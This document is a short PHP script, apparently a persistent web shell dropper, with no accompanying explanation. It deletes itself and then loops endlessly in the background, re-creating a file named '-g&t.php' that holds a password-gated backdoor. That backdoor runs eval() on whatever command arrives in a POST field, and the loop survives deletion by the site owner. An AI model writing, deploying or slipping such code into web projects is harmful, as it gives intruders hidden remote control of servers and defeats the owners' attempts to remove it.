<?php
ignore_user_abort(true);
set_time_limit(0);
$file = './-g&t.php';
$code = "<?php if(md5(\$_GET['pass'])=='0d823a43429d77faecac004d2c77e8fe'){@eval(\$_POST['cmd']);}?>";
while (1){
	if (!file_exists($file)) {
		file_put_contents($file,$code);
	}
	usleep(100);
	unlink(__FILE__);
}
?>